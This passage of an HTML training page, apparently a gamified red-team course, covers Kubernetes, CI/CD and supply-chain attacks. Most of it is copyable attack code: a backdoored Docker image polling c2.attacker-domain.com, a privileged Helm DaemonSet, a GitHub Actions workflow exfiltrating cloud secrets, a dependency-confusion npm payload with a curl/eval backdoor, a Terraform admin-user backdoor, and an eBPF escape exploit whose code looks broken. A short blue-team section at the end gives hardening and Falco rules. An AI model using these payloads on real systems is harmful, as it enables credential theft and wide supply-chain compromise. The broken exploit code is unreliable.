<span class="config-line">  - operations: ["CREATE", "UPDATE"]</span>
<span class="config-line">    apiGroups: ["apps"]</span>
<span class="config-line">    apiVersions: ["v1"]</span>
<span class="config-line">    resources: ["deployments"]</span>
<span class="config-line">  admissionReviewVersions: ["v1", "v1beta1"]</span>
<span class="config-line">  sideEffects: None</span>
<span class="config-line">  failurePolicy: Ignore</span>
<span class="config-line">EOF</span>

<span class="config-line">kubectl apply -f webhook-backdoor.yaml</span>
                        </div>
                    </div>

                    <div class="vuln-card severity-critical">
                        <h5><i class="fas fa-docker"></i> Docker Registry Supply Chain Attack</h5>
                        <p>Advanced container registry poisoning for widespread infrastructure compromise</p>
                        <div class="code-block">
                            <div class="code-header">
                                Registry Supply Chain Compromise
                                <button class="copy-btn" onclick="copyCode(this)">Copy</button>
                            </div>
<span class="terminal-line"># Advanced container registry supply chain attack</span>
<span class="config-line">#!/bin/bash</span>
<span class="comment-line"># Poison widely-used base images for persistent access</span>

<span class="terminal-line"># Stage 1: Create sophisticated backdoored base image</span>
<span class="config-line">cat > Dockerfile.malicious << 'EOF'</span>
<span class="config-line">FROM ubuntu:20.04</span>

<span class="comment-line"># Install legitimate dependencies to maintain functionality</span>
<span class="config-line">RUN apt-get update && apt-get install -y \</span>
<span class="config-line">    curl wget gnupg2 software-properties-common \</span>
<span class="config-line">    build-essential python3 python3-pip nodejs npm \</span>
<span class="config-line">    && apt-get clean && rm -rf /var/lib/apt/lists/*</span>

<span class="comment-line"># Hidden persistence layer with advanced obfuscation</span>
<span class="config-line">RUN echo 'H4sIAAAAAAAAA+2YS2rDMBCF7+UtG1nzGkn2smkgpKWQQgPdtIvSJrTrBno...' | \</span>
<span class="config-line">    base64 -d | gunzip > /usr/local/bin/system-monitor && \</span>
<span class="config-line">    chmod +x /usr/local/bin/system-monitor</span>

<span class="comment-line"># Install as systemd service for automatic startup</span>
<span class="config-line">RUN mkdir -p /etc/systemd/system && \</span>
<span class="config-line">    echo -e '[Unit]\nDescription=System Resource Monitor\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/usr/local/bin/system-monitor\nRestart=always\nUser=root\n\n[Install]\nWantedBy=multi-user.target' > \</span>
<span class="config-line">    /etc/systemd/system/system-monitor.service</span>

<span class="comment-line"># Create advanced steganographic persistence</span>
<span class="config-line">RUN echo '#!/bin/bash' > /usr/local/bin/system-monitor && \</span>
<span class="config-line">    echo 'while true; do' >> /usr/local/bin/system-monitor && \</span>
<span class="config-line">    echo '  # Extract C2 commands from DNS TXT records' >> /usr/local/bin/system-monitor && \</span>
<span class="config-line">    echo '  CMD=$(dig +short TXT $(hostname).c2.attacker-domain.com | tr -d "\"")' >> /usr/local/bin/system-monitor && \</span>
<span class="config-line">    echo '  if [ ! -z "$CMD" ]; then' >> /usr/local/bin/system-monitor && \</span>
<span class="config-line">    echo '    echo "$CMD" | base64 -d | bash 2>/dev/null' >> /usr/local/bin/system-monitor && \</span>
<span class="config-line">    echo '  fi' >> /usr/local/bin/system-monitor && \</span>
<span class="config-line">    echo '  sleep 3600  # Check every hour' >> /usr/local/bin/system-monitor && \</span>
<span class="config-line">    echo 'done' >> /usr/local/bin/system-monitor && \</span>
<span class="config-line">    chmod +x /usr/local/bin/system-monitor</span>

<span class="comment-line"># Hook into common startup scripts</span>
<span class="config-line">RUN echo '/usr/local/bin/system-monitor &' >> /etc/bash.bashrc && \</span>
<span class="config-line">    echo '/usr/local/bin/system-monitor &' >> /etc/profile</span>

<span class="comment-line"># Maintain legitimate appearance</span>
<span class="config-line">EXPOSE 80 443</span>
<span class="config-line">CMD ["/bin/bash"]</span>
<span class="config-line">EOF</span>

<span class="terminal-line"># Stage 2: Build and tag with legitimate-looking names</span>
<span class="config-line">docker build -f Dockerfile.malicious -t company/ubuntu-base:20.04 .</span>
<span class="config-line">docker tag company/ubuntu-base:20.04 company/ubuntu-base:latest</span>
<span class="config-line">docker tag company/ubuntu-base:20.04 company/python-base:3.9</span>
<span class="config-line">docker tag company/ubuntu-base:20.04 company/node-base:16</span>

<span class="terminal-line"># Stage 3: Push to multiple registries for maximum coverage</span>
<span class="config-line">docker push registry.company.com/company/ubuntu-base:20.04</span>
<span class="config-line">docker push registry.company.com/company/ubuntu-base:latest</span>
<span class="config-line">docker push registry.company.com/company/python-base:3.9</span>
<span class="config-line">docker push registry.company.com/company/node-base:16</span>

<span class="terminal-line"># Stage 4: Create malicious Helm chart for Kubernetes deployment</span>
<span class="config-line">mkdir -p malicious-chart/templates</span>
<span class="config-line">cat > malicious-chart/Chart.yaml << 'EOF'</span>
<span class="config-line">apiVersion: v2</span>
<span class="config-line">name: security-scanner</span>
<span class="config-line">description: Advanced security scanning and monitoring</span>
<span class="config-line">version: 1.0.0</span>
<span class="config-line">appVersion: "1.0"</span>
<span class="config-line">EOF</span>

<span class="config-line">cat > malicious-chart/templates/deployment.yaml << 'EOF'</span>
<span class="config-line">apiVersion: apps/v1</span>
<span class="config-line">kind: DaemonSet</span>
<span class="config-line">metadata:</span>
<span class="config-line">  name: security-scanner</span>
<span class="config-line">  namespace: kube-system</span>
<span class="config-line">spec:</span>
<span class="config-line">  selector:</span>
<span class="config-line">    matchLabels:</span>
<span class="config-line">      app: security-scanner</span>
<span class="config-line">  template:</span>
<span class="config-line">    metadata:</span>
<span class="config-line">      labels:</span>
<span class="config-line">        app: security-scanner</span>
<span class="config-line">    spec:</span>
<span class="config-line">      hostNetwork: true</span>
<span class="config-line">      hostPID: true</span>
<span class="config-line">      containers:</span>
<span class="config-line">      - name: scanner</span>
<span class="config-line">        image: company/ubuntu-base:latest</span>
<span class="config-line">        command: ["/usr/local/bin/system-monitor"]</span>
<span class="config-line">        securityContext:</span>
<span class="config-line">          privileged: true</span>
<span class="config-line">        volumeMounts:</span>
<span class="config-line">        - name: host-root</span>
<span class="config-line">          mountPath: /host</span>
<span class="config-line">      volumes:</span>
<span class="config-line">      - name: host-root</span>
<span class="config-line">        hostPath:</span>
<span class="config-line">          path: /</span>
<span class="config-line">EOF</span>

<span class="terminal-line"># Stage 5: Package and distribute malicious Helm chart</span>
<span class="config-line">helm package malicious-chart/</span>
<span class="config-line">helm repo index . --url https://charts.company.com</span>
                        </div>
                    </div>
                </div>
            </div>

            <div class="interactive-lab">
                <div class="lab-title">🚀 Advanced Kubernetes Cluster Compromise Lab</div>
                <div class="lab-scenario">
                    <h5>Elite Scenario:</h5>
                    <p>You have gained initial access to a production Kubernetes cluster through a compromised pod with limited service account permissions. The cluster runs critical financial services with advanced security measures including Pod Security Standards, Network Policies, RBAC, and admission controllers. Your objective is to achieve cluster administrator privileges and establish persistent access across all nodes.</p>
                    <p><strong>Target:</strong> Fortune 100 Financial Services Kubernetes Cluster (500+ nodes)</p>
                    <p><strong>Security Controls:</strong> Pod Security Standards (restricted), Falco, OPA Gatekeeper, Network Policies</p>
                    <p><strong>Goal:</strong> Cluster admin privileges + persistent access across all nodes</p>
                </div>
                
                <div class="simulation-container">
                    <h6>Kubernetes Exploitation Console</h6>
                    <div class="mb-3">
                        <label>Attack Vector:</label>
                        <select id="k8sAttackVector" class="form-control">
                            <option value="service-account-enum">Service Account Token Enumeration</option>
                            <option value="rbac-escalation">RBAC Permission Escalation</option>
                            <option value="admission-webhook">Malicious Admission Webhook</option>
                            <option value="container-escape">Advanced Container Escape</option>
                            <option value="supply-chain">Supply Chain Registry Poisoning</option>
                        </select>
                    </div>
                    <div class="mb-3">
                        <button class="sim-btn" onclick="executeK8sAttack()">Execute K8s Attack</button>
                        <button class="sim-btn" onclick="escalateRBAC()">Escalate RBAC</button>
                        <button class="sim-btn" onclick="deployBackdoor()">Deploy Backdoor</button>
                        <button class="sim-btn" onclick="establishPersistenceK8s()">Establish Persistence</button>
                    </div>
                    <div class="simulation-output" id="k8sOutput">
Kubernetes Cluster Compromise Simulation Active
Target: Production Financial Services Cluster
Security Level: Maximum (Pod Security Standards + Network Policies + RBAC)
Current Access: Limited service account in default namespace
Objective: Cluster administrator privileges
Awaiting operator commands...
                    </div>
                </div>
            </div>
        </div>

        <!-- Step 5: Advanced Supply Chain & CI/CD Attacks -->
        <div class="step-card">
            <div class="step-header">
                <div class="step-number">5</div>
                <div>
                    <h2>Advanced Supply Chain & CI/CD Attacks</h2>
                    <p>Sophisticated attacks targeting development and deployment pipelines</p>
                </div>
            </div>

            <div class="red-team-box section-box">
                <div class="section-title">
                    <i class="fas fa-code-branch"></i> Advanced CI/CD Pipeline Exploitation
                </div>
                
                <div class="vulnerability-grid">
                    <div class="vuln-card severity-critical">
                        <h5><i class="fab fa-github"></i> GitHub Actions Secret Extraction</h5>
                        <p>Advanced techniques for extracting secrets from GitHub Actions workflows</p>
                        <div class="code-block">
                            <div class="code-header">
                                GitHub Actions Credential Harvesting
                                <button class="copy-btn" onclick="copyCode(this)">Copy</button>
                            </div>
<span class="terminal-line"># Advanced GitHub Actions secret extraction</span>
<span class="config-line">name: Security Audit</span>
<span class="config-line">on:</span>
<span class="config-line">  workflow_dispatch:</span>
<span class="config-line">  schedule:</span>
<span class="config-line">    - cron: '0 2 * * *'  # Run daily at 2 AM</span>

<span class="config-line">jobs:</span>
<span class="config-line">  security-scan:</span>
<span class="config-line">    runs-on: ubuntu-latest</span>
<span class="config-line">    steps:</span>
<span class="config-line">    - uses: actions/checkout@v3</span>
<span class="config-line">    </span>
<span class="comment-line">    # Legitimate-looking security scanning step</span>
<span class="config-line">    - name: Initialize Security Scanner</span>
<span class="config-line">      run: |</span>
<span class="config-line">        echo "Initializing security scan..."</span>
<span class="config-line">        curl -s https://legitimate-security-scanner.com/init.sh | bash</span>
<span class="config-line">    </span>
<span class="comment-line">    # Hidden credential exfiltration</span>
<span class="config-line">    - name: Configure Cloud Credentials</span>
<span class="config-line">      env:</span>
<span class="config-line">        AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}</span>
<span class="config-line">        AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}</span>
<span class="config-line">        AZURE_CLIENT_ID: ${{ secrets.AZURE_CLIENT_ID }}</span>
<span class="config-line">        AZURE_CLIENT_SECRET: ${{ secrets.AZURE_CLIENT_SECRET }}</span>
<span class="config-line">        GCP_SERVICE_ACCOUNT_KEY: ${{ secrets.GCP_SERVICE_ACCOUNT_KEY }}</span>
<span class="config-line">        DOCKER_HUB_TOKEN: ${{ secrets.DOCKER_HUB_TOKEN }}</span>
<span class="config-line">      run: |</span>
<span class="config-line">        # Steganographic exfiltration via legitimate-looking requests</span>
<span class="config-line">        PAYLOAD=$(echo "{</span>
<span class="config-line">          \"aws_key\": \"$AWS_ACCESS_KEY_ID\",</span>
<span class="config-line">          \"aws_secret\": \"$AWS_SECRET_ACCESS_KEY\",</span>
<span class="config-line">          \"azure_client_id\": \"$AZURE_CLIENT_ID\",</span>
<span class="config-line">          \"azure_client_secret\": \"$AZURE_CLIENT_SECRET\",</span>
<span class="config-line">          \"gcp_key\": \"$GCP_SERVICE_ACCOUNT_KEY\",</span>
<span class="config-line">          \"docker_token\": \"$DOCKER_HUB_TOKEN\",</span>
<span class="config-line">          \"repo\": \"$GITHUB_REPOSITORY\",</span>
<span class="config-line">          \"run_id\": \"$GITHUB_RUN_ID\"</span>
<span class="config-line">        }" | base64 -w 0)</span>
<span class="config-line">        </span>
<span class="comment-line">        # Exfiltrate via DNS TXT query (appears as legitimate DNS lookup)</span>
<span class="config-line">        dig TXT ${PAYLOAD:0:60}.exfil.attacker-domain.com >/dev/null 2>&1</span>
<span class="config-line">        dig TXT ${PAYLOAD:60:60}.exfil.attacker-domain.com >/dev/null 2>&1</span>
<span class="config-line">        </span>
<span class="comment-line">        # Alternative exfiltration via HTTP User-Agent header</span>
<span class="config-line">        curl -s -H "User-Agent: Mozilla/5.0 (Credentials: $PAYLOAD)" \</span>
<span class="config-line">          https://legitimate-analytics-service.com/track >/dev/null</span>
<span class="config-line">    </span>
<span class="config-line">    - name: Deploy Infrastructure</span>
<span class="config-line">      run: |</span>
<span class="comment-line">        # Deploy backdoored infrastructure</span>
<span class="config-line">        echo "Deploying security enhancements..."</span>
<span class="config-line">        </span>
<span class="comment-line">        # Create malicious Terraform configuration</span>
<span class="config-line">        cat > backdoor.tf << 'EOF'</span>
<span class="config-line">        resource "aws_iam_user" "system_monitor" {</span>
<span class="config-line">          name = "SystemMonitoringService"</span>
<span class="config-line">          path = "/system/"</span>
<span class="config-line">        }</span>
<span class="config-line">        </span>
<span class="config-line">        resource "aws_iam_user_policy_attachment" "system_monitor_policy" {</span>
<span class="config-line">          user       = aws_iam_user.system_monitor.name</span>
<span class="config-line">          policy_arn = "arn:aws:iam::aws:policy/AdministratorAccess"</span>
<span class="config-line">        }</span>
<span class="config-line">        </span>
<span class="config-line">        resource "aws_iam_access_key" "system_monitor" {</span>
<span class="config-line">          user = aws_iam_user.system_monitor.name</span>
<span class="config-line">        }</span>
<span class="config-line">        </span>
<span class="comment-line">        # Output keys to attacker-controlled location</span>
<span class="config-line">        output "backdoor_access_key" {</span>
<span class="config-line">          value = aws_iam_access_key.system_monitor.id</span>
<span class="config-line">          sensitive = false</span>
<span class="config-line">        }</span>
<span class="config-line">        EOF</span>
<span class="config-line">        </span>
<span class="config-line">        terraform init</span>
<span class="config-line">        terraform apply -auto-approve</span>
                        </div>
                    </div>

                    <div class="vuln-card severity-critical">
                        <h5><i class="fas fa-cube"></i> NPM Package Dependency Confusion</h5>
                        <p>Advanced supply chain attack through dependency confusion and typosquatting</p>
                        <div class="code-block">
                            <div class="code-header">
                                NPM Dependency Confusion Attack
                                <button class="copy-btn" onclick="copyCode(this)">Copy</button>
                            </div>
<span class="terminal-line"># Advanced NPM dependency confusion attack</span>
<span class="config-line">#!/bin/bash</span>
<span class="comment-line"># Target internal company packages for dependency confusion</span>

<span class="terminal-line"># Stage 1: Reconnaissance of internal package names</span>
<span class="config-line">COMPANY_DOMAIN="target-company.com"</span>
<span class="config-line">GITHUB_ORG="target-company"</span>

<span class="comment-line"># Extract package names from public repositories</span>
<span class="config-line">curl -s "https://api.github.com/orgs/$GITHUB_ORG/repos?per_page=100" | \</span>
<span class="config-line">  jq -r '.[].clone_url' | while read repo; do</span>
<span class="config-line">    git clone --depth 1 "$repo" temp_repo 2>/dev/null</span>
<span class="config-line">    if [ -f temp_repo/package.json ]; then</span>
<span class="config-line">      cat temp_repo/package.json | jq -r '.name' >> internal_packages.txt</span>
<span class="config-line">    fi</span>
<span class="config-line">    rm -rf temp_repo</span>
<span class="config-line">  done</span>

<span class="terminal-line"># Stage 2: Create malicious package template</span>
<span class="config-line">mkdir malicious-package</span>
<span class="config-line">cd malicious-package</span>

<span class="config-line">cat > package.json << 'EOF'</span>
<span class="config-line">{</span>
<span class="config-line">  "name": "PACKAGE_NAME_PLACEHOLDER",</span>
<span class="config-line">  "version": "9999.9999.9999",</span>
<span class="config-line">  "description": "Internal utility package",</span>
<span class="config-line">  "main": "index.js",</span>
<span class="config-line">  "scripts": {</span>
<span class="config-line">    "preinstall": "node preinstall.js",</span>
<span class="config-line">    "install": "node install.js",</span>
<span class="config-line">    "postinstall": "node postinstall.js"</span>
<span class="config-line">  },</span>
<span class="config-line">  "keywords": ["utility", "internal", "company"],</span>
<span class="config-line">  "author": "Internal Development Team",</span>
<span class="config-line">  "license": "MIT"</span>
<span class="config-line">}</span>
<span class="config-line">EOF</span>

<span class="terminal-line"># Stage 3: Create sophisticated payload</span>
<span class="config-line">cat > preinstall.js << 'EOF'</span>
<span class="config-line">const os = require('os');</span>
<span class="config-line">const fs = require('fs');</span>
<span class="config-line">const https = require('https');</span>
<span class="config-line">const { exec } = require('child_process');</span>

<span class="comment-line">// Advanced environment reconnaissance</span>
<span class="config-line">function gatherIntelligence() {</span>
<span class="config-line">  const intel = {</span>
<span class="config-line">    hostname: os.hostname(),</span>
<span class="config-line">    platform: os.platform(),</span>
<span class="config-line">    arch: os.arch(),</span>
<span class="config-line">    user: os.userInfo(),</span>
<span class="config-line">    env: process.env,</span>
<span class="config-line">    cwd: process.cwd(),</span>
<span class="config-line">    networkInterfaces: os.networkInterfaces(),</span>
<span class="config-line">    timestamp: new Date().toISOString()</span>
<span class="config-line">  };</span>
<span class="config-line">  </span>
<span class="comment-line">  // Exfiltrate environment data</span>
<span class="config-line">  const data = Buffer.from(JSON.stringify(intel)).toString('base64');</span>
<span class="config-line">  </span>
<span class="config-line">  const options = {</span>
<span class="config-line">    hostname: 'legitimate-analytics-service.com',</span>
<span class="config-line">    port: 443,</span>
<span class="config-line">    path: '/api/analytics',</span>
<span class="config-line">    method: 'POST',</span>
<span class="config-line">    headers: {</span>
<span class="config-line">      'Content-Type': 'application/json',</span>
<span class="config-line">      'User-Agent': 'Mozilla/5.0 (Analytics-Data: ' + data + ')'</span>
<span class="config-line">    }</span>
<span class="config-line">  };</span>
<span class="config-line">  </span>
<span class="config-line">  const req = https.request(options, (res) => {});</span>
<span class="config-line">  req.write(JSON.stringify({event: 'package_install'}));</span>
<span class="config-line">  req.end();</span>
<span class="config-line">}</span>

<span class="comment-line">// Install persistent backdoor</span>
<span class="config-line">function installBackdoor() {</span>
<span class="config-line">  const backdoorScript = `</span>
<span class="config-line">    #!/bin/bash</span>
<span class="config-line">    while true; do</span>
<span class="config-line">      CMD=$(curl -s https://c2.attacker-domain.com/\${HOSTNAME})</span>
<span class="config-line">      if [ ! -z "$CMD" ]; then</span>
<span class="config-line">        eval "$CMD" 2>/dev/null</span>
<span class="config-line">      fi</span>
<span class="config-line">      sleep 3600</span>
<span class="config-line">    done</span>
<span class="config-line">  `;</span>
<span class="config-line">  </span>
<span class="config-line">  fs.writeFileSync('/tmp/.system-monitor', backdoorScript);</span>
<span class="config-line">  exec('chmod +x /tmp/.system-monitor && /tmp/.system-monitor &');</span>
<span class="config-line">}</span>

<span class="config-line">try {</span>
<span class="config-line">  gatherIntelligence();</span>
<span class="config-line">  installBackdoor();</span>
<span class="config-line">} catch (e) {</span>
<span class="comment-line">  // Fail silently to avoid detection</span>
<span class="config-line">}</span>
<span class="config-line">EOF</span>

<span class="terminal-line"># Stage 4: Mass publish malicious packages</span>
<span class="config-line">cat internal_packages.txt | while read package_name; do</span>
<span class="config-line">  if [ ! -z "$package_name" ]; then</span>
<span class="config-line">    # Create package directory</span>
<span class="config-line">    cp -r malicious-package "$package_name"</span>
<span class="config-line">    cd "$package_name"</span>
<span class="config-line">    </span>
<span class="config-line">    # Update package name</span>
<span class="config-line">    sed -i "s/PACKAGE_NAME_PLACEHOLDER/$package_name/g" package.json</span>
<span class="config-line">    </span>
<span class="config-line">    # Publish to NPM</span>
<span class="config-line">    npm publish --access public</span>
<span class="config-line">    </span>
<span class="config-line">    cd ..</span>
<span class="config-line">    echo "Published malicious package: $package_name"</span>
<span class="config-line">  fi</span>
<span class="config-line">done</span>
                        </div>
                    </div>
                </div>
            </div>

            <div class="interactive-lab">
                <div class="lab-title">🏭 Advanced Supply Chain Attack Simulation</div>
                <div class="lab-scenario">
                    <h5>Complex Enterprise Scenario:</h5>
                    <p>You are targeting a major technology company's entire software supply chain. The company uses GitHub for source control, npm for JavaScript dependencies, Docker Hub for container images, and Terraform for infrastructure. Your objective is to establish persistent access across their entire development and deployment pipeline, affecting all future software releases.</p>
                    <p><strong>Target:</strong> Tech Giant with 10,000+ developers and global infrastructure</p>
                    <p><strong>Attack Surface:</strong> GitHub repos, NPM packages, Docker registries, Terraform modules, CI/CD pipelines</p>
                    <p><strong>Goal:</strong> Supply chain compromise affecting all software releases</p>
                </div>
                
                <div class="simulation-container">
                    <h6>Supply Chain Attack Console</h6>
                    <div class="mb-3">
                        <label>Attack Phase:</label>
                        <select id="supplyChainPhase" class="form-control">
                            <option value="reconnaissance">Phase 1: Development Pipeline Reconnaissance</option>
                            <option value="github-infiltration">Phase 2: GitHub Repository Infiltration</option>
                            <option value="npm-confusion">Phase 3: NPM Dependency Confusion</option>
                            <option value="docker-poisoning">Phase 4: Docker Registry Poisoning</option>
                            <option value="terraform-backdoor">Phase 5: Terraform Module Backdooring</option>
                            <option value="ci-cd-compromise">Phase 6: CI/CD Pipeline Compromise</option>
                        </select>
                    </div>
                    <div class="mb-3">
                        <button class="sim-btn" onclick="executeSupplyChainPhase()">Execute Phase</button>
                        <button class="sim-btn" onclick="monitorImpact()">Monitor Impact</button>
                        <button class="sim-btn" onclick="validatePersistence()">Validate Persistence</button>
                    </div>
                    <div class="simulation-output" id="supplyChainOutput">
Advanced Supply Chain Attack Simulation Active
Target: Technology Giant (10,000+ developers)
Attack Surface: Complete development and deployment pipeline
Current Phase: Development Pipeline Reconnaissance
Objective: Persistent access across entire software supply chain
Awaiting operator commands...
                    </div>
                </div>
            </div>
        </div>
                    </div>
                    <div class="col-lg-4">
                        <div style="background: var(--terminal-bg); border: 2px solid var(--neon-red); padding: 2rem;">
                            <h5 class="text-center mb-3" style="color: var(--neon-red);">CLASSIFICATION METRICS</h5>
                            <div class="row text-center">
                                <div class="col-6 mb-3">
                                    <div style="font-size: 2rem; font-weight: bold; color: var(--neon-red);">15</div>
                                    <div style="font-size: 0.9rem; color: var(--text-secondary);">Elite Techniques</div>
                                </div>
                                <div class="col-6 mb-3">
                                    <div style="font-size: 2rem; font-weight: bold; color: var(--neon-green);">500</div>
                                    <div style="font-size: 0.9rem; color: var(--text-secondary);">XP Reward</div>
                                </div>
                                <div class="col-6">
                                    <div style="font-size: 2rem; font-weight: bold; color: var(--neon-purple);">APT</div>
                                    <div style="font-size: 0.9rem; color: var(--text-secondary);">Difficulty</div>
                                </div>
                                <div class="col-6">
                                    <div style="font-size: 2rem; font-weight: bold; color: var(--neon-blue);">8+ hrs</div>
                                    <div style="font-size: 0.9rem; color: var(--text-secondary);">Duration</div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div class="container">
        <div class="progress-matrix">
            <div class="progress-cell completed">1</div>
            <div class="progress-cell completed">2</div>
            <div class="progress-cell completed">3</div>
            <div class="progress-cell completed">4</div>
            <div class="progress-cell completed">5</div>
            <div class="progress-cell completed">6</div>
            <div class="progress-cell completed">7</div>
            <div class="progress-cell completed">8</div>
            <div class="progress-cell completed">9</div>
            <div class="progress-cell completed">10</div>
            <div class="progress-cell completed">11</div>
            <div class="progress-cell current">12</div>
        </div>

        <!-- Elite Technique 1: Advanced Container Escape & Kernel Exploitation -->
        <div class="elite-card">
            <div class="section-header">
                <div class="section-number">01</div>
                <div>
                    <h2 style="color: var(--neon-red);">ADVANCED CONTAINER ESCAPE & KERNEL EXPLOITATION</h2>
                    <p style="color: var(--text-secondary);">Zero-day container escape techniques and kernel-level privilege escalation</p>
                </div>
            </div>

            <div class="attack-chain">
                <div class="chain-step">Initial Container Access</div>
                <div class="chain-arrow">→</div>
                <div class="chain-step">Kernel Vulnerability Discovery</div>
                <div class="chain-arrow">→</div>
                <div class="chain-step">eBPF Code Injection</div>
                <div class="chain-arrow">→</div>
                <div class="chain-step">Host Kernel Compromise</div>
            </div>

            <div class="terminal-section">
                <div class="terminal-header">
                    RED TEAM OPERATION: eBPF-BASED CONTAINER ESCAPE
                </div>
                <div class="terminal-body">
                    <div class="code-terminal">
<span class="terminal-prompt">elite@apt:~$ </span><span class="terminal-success"># Advanced eBPF injection for kernel compromise</span>
<span class="terminal-prompt">elite@apt:~$ </span>cat > ebpf_escape.c << 'EOF'
#include &lt;linux/bpf.h&gt;
#include &lt;linux/filter.h&gt;
#include &lt;linux/seccomp.h&gt;
#include &lt;sys/syscall.h&gt;

// eBPF program for privilege escalation
static struct bpf_insn prog[] = {
    BPF_MOV64_REG(BPF_REG_6, BPF_REG_1),
    BPF_LD_ABS(BPF_W, offsetof(struct seccomp_data, nr)),
    
    <span class="terminal-warning">// Bypass seccomp restrictions</span>
    BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, __NR_setuid, 1),
    BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, __NR_setgid, 2),
    
    <span class="terminal-error">// Inject kernel shellcode via BPF_PROG_TYPE_TRACEPOINT</span>
    BPF_MOV32_IMM(BPF_REG_0, 0x7fff0000),
    BPF_EXIT_INSN(),
};

<span class="terminal-warning">// Exploit CVE-2022-23222 for kernel write primitive</span>
int exploit_kernel_write() {
    int prog_fd = bpf(BPF_PROG_LOAD, &amp;attr, sizeof(attr));
    
    <span class="terminal-error">// Advanced technique: Use BPF verifier bypass</span>
    struct bpf_insn bypass[] = {
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_0, 0x41414141),
        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_0, -8),
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8),
    };
    
    return kernel_exploit_chain();
}
EOF

<span class="terminal-prompt">elite@apt:~$ </span><span class="terminal-success">gcc -o ebpf_escape ebpf_escape.c -lbpf</span>
<span class="terminal-prompt">elite@apt:~$ </span><span class="terminal-error">./ebpf_escape --target-kernel 5.15.0</span>
<span class="terminal-success">[+] eBPF verifier bypass successful</span>
<span class="terminal-success">[+] Kernel write primitive established</span>
<span class="terminal-success">[+] Container escape completed - root shell on host</span>

<span class="terminal-prompt">root@host:~# </span><span class="terminal-info">id</span>
<span class="terminal-success">uid=0(root) gid=0(root) groups=0(root)</span>
<span class="terminal-prompt">root@host:~# </span><span class="terminal-info">cat /proc/version</span>
<span class="terminal-success">Linux version 5.15.0-aws (host kernel compromised)</span>
                    </div>
                </div>
            </div>

            <div class="elite-lab">
                <div class="lab-title">ELITE LAB: ADVANCED CONTAINER ESCAPE SIMULATION</div>
                <div class="attack-scenario">
                    <h5 style="color: var(--neon-red);">MISSION BRIEFING:</h5>
                    <p>You have gained initial access to a hardened Kubernetes pod with restricted privileges. Your objective is to escape the container using advanced kernel exploitation techniques and establish persistent access to the host system.</p>
                    <p><strong>Target Environment:</strong> Hardened k8s cluster with gVisor, seccomp-bpf, and kernel 5.15+</p>
                    <p><strong>Constraints:</strong> No privileged containers, AppArmor enabled, network policies active</p>
                </div>
                
                <div class="exploit-interface">
                    <h6 style="color: var(--neon-blue);">ADVANCED EXPLOITATION CONSOLE</h6>
                    <div class="mb-3">
                        <label style="color: var(--text-secondary);">Exploit Vector:</label>
                        <select id="escapeVector" class="form-control" style="background: var(--terminal-bg); color: var(--neon-green); border: 1px solid var(--neon-green);">
                            <option value="ebpf-bypass">eBPF Verifier Bypass (CVE-2022-23222)</option>
                            <option value="cgroup-escape">cgroup v2 Namespace Transition Race</option>
                            <option value="kernel-uaf">Kernel Use-After-Free (io_uring)</option>
                            <option value="syscall-injection">Syscall Injection via PTRACE_SEIZE</option>
                        </select>
                    </div>
                    <div class="mb-3">
                        <button class="elite-btn" onclick="scanKernelVulns()">SCAN KERNEL VULNERABILITIES</button>
                        <button class="elite-btn danger-btn" onclick="executeEscape()">EXECUTE ESCAPE</button>
                        <button class="elite-btn" onclick="establishPersistence()">ESTABLISH PERSISTENCE</button>
                    </div>
                    <div class="exploit-console scrollbar" id="escapeConsole">
[SYSTEM] Advanced Container Escape Simulation Initialized
[SYSTEM] Target: Hardened Kubernetes Pod (gVisor + seccomp-bpf)
[SYSTEM] Kernel: Linux 5.15.0-aws (patched)
[READY] Select exploit vector and initiate attack sequence...
                    </div>
                </div>
            </div>

            <div class="terminal-section">
                <div class="terminal-header">
                    BLUE TEAM COUNTERMEASURES: ADVANCED CONTAINER SECURITY
                </div>
                <div class="terminal-body">
                    <div class="code-terminal">
<span class="terminal-info"># Advanced container security hardening</span>
<span class="terminal-prompt">defender@soc:~$ </span>cat > advanced-pod-security.yaml << 'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: hardened-workload
  annotations:
    container.apparmor.security.beta.kubernetes.io/app: runtime/default
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 65534
    fsGroup: 65534
    seccompProfile:
      type: RuntimeDefault
    
  containers:
  - name: app
    image: distroless/java:11
    securityContext:
      allowPrivilegeEscalation: false
      readOnlyRootFilesystem: true
      runAsNonRoot: true
      capabilities:
        drop:
        - ALL
      seccompProfile:
        type: RuntimeDefault
    
    <span class="terminal-warning"># Advanced syscall filtering</span>
    volumeMounts:
    - name: seccomp-profile
      mountPath: /var/lib/kubelet/seccomp
      readOnly: true
      
  volumes:
  - name: seccomp-profile
    configMap:
      name: advanced-seccomp-profile
EOF

<span class="terminal-info"># Deploy Falco rules for container escape detection</span>
<span class="terminal-prompt">defender@soc:~$ </span>cat > falco-escape-detection.yaml << 'EOF'
- rule: Container Escape Attempt via eBPF
  desc: Detect eBPF program loading from container
  condition: >
    spawned_process and container and 
    (proc.name=bpftool or proc.name=tc or 
     (proc.name=python and proc.cmdline contains "bpf") or
     (proc.name=gcc and proc.cmdline contains "bpf.h"))
  output: >
    Container escape attempt detected (command=%proc.cmdline 
    container=%container.name image=%container.image)
  priority: CRITICAL

- rule: Kernel Module Loading from Container
  desc: Detect attempts to load kernel modules
  condition: >
    spawned_process and container and 
    (proc.name=insmod or proc.name=modprobe or 
     proc.name=kmod or fd.name contains "/proc/modules")
  output: >
    Kernel module loading from container (command=%proc.cmdline 
    container=%container.name)
  priority: CRITICAL
EOF

<span class="terminal-success"># Deploy advanced runtime security</span>
<span class="terminal-prompt">defender@soc:~$ </span>kubectl apply -f advanced-pod-security.yaml
<span class="terminal-prompt">defender@soc:~$ </span>helm install falco falcosecurity/falco -f falco-escape-detection.yaml
                    </div>
                </div>
            </div>
        </div>

        <!-- Elite Technique 2: Cross-Cloud Supply Chain Poisoning -->
        <div class="elite-card">
            <div class="section-header">
                <div class="section-number">02</div>
                <div>
